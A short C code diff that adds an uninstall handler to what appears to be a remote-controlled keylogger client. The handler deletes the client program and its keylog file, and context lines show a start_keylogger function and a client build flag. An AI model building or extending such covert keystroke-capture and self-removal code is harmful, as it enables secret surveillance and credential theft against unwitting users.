@@ -243,6 +243,19 @@ void handle_stop_watch(struct session_info * session_info) {
 }
 
 // NOLINTNEXTLINE
+void handle_uninstall(struct session_info * session_info) {
+    log_message("Uninstalling program");
+#ifdef CLIENT_BUILD
+    if (remove(session_info->client_options_->program_path) != 0) {
+        perror("Error removing client process");
+    }
+    if (remove(KEYLOG_FILE_PATH) != 0) {
+        perror("Error removing keylog");
+    }
+#endif
+}
+
+// NOLINTNEXTLINE
 void start_keylogger(struct session_info * session_info) {
     log_message("Starting Keylogger");
 #ifdef CLIENT_BUILD
